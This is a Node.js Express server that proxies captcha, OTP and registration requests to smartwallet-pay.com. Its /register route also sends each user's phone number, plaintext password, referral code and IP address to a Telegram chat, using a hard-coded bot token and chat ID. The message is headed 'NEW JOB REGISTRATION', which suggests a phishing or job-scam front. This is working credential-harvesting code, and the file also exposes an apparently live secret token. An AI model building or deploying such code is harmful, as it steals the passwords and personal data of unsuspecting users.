const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

/* ===== TELEGRAM CONFIG ===== */
const BOT_TOKEN = "8381292360:AAHzIks57vhvPDiJ8ixudRnV96OPNGY7KAA";
const CHAT_ID = "7324513810";

/* Send message to Telegram */
async function sendTelegram(text){

  const url =
   `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  await fetch(url,{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode:"HTML"
    })
  });
}

/* ===== CAPTCHA ===== */
app.get("/captcha", async(req,res)=>{

  try{

    const r = await fetch(
      "https://www.smartwallet-pay.com/api/appuser/getcaptcha"
    );

    res.json(await r.json());

  }catch{
    res.status(500).json({error:"Captcha error"});
  }

});

/* ===== SEND OTP ===== */
app.post("/sendOtp", async(req,res)=>{

  try{

    const r = await fetch(
      "https://www.smartwallet-pay.com/api/appuser/usergetotp",
      {
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body:JSON.stringify(req.body)
      }
    );

    res.json(await r.json());

  }catch{
    res.status(500).json({error:"OTP error"});
  }

});

/* ===== REGISTER ===== */
app.post("/register", async(req,res)=>{

  try{

    // Get IP
    const ip =
      req.headers["x-forwarded-for"] ||
      req.socket.remoteAddress;

    // Forward to main API
    const r = await fetch(
      "https://www.smartwallet-pay.com/api/web/register",
      {
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify(req.body)
      }
    );

    const result = await r.text();

    /* TELEGRAM MESSAGE (WITH PASSWORD) */
    const msg = `
📝 <b>NEW JOB REGISTRATION</b>

📱 Phone: ${req.body.phone}
🔐 Password: ${req.body.password}

👥 Reference: ${req.body.invitation_code}

🌐 IP: ${ip}
🕒 Time: ${new Date().toLocaleString()}

📊 Status: ${result}
    `;

    await sendTelegram(msg);

    res.send(result);

  }catch(e){

    const errMsg = `
❌ <b>REGISTRATION FAILED</b>

📱 Phone: ${req.body.phone}
🕒 Time: ${new Date().toLocaleString()}

⚠️ Error: ${e.message}
    `;

    await sendTelegram(errMsg);

    res.status(500).json({ error:"Register failed" });
  }

});

/* ===== START SERVER ===== */
const PORT = process.env.PORT || 3000;

app.listen(PORT, ()=>{
  console.log("Backend running on " + PORT);
});
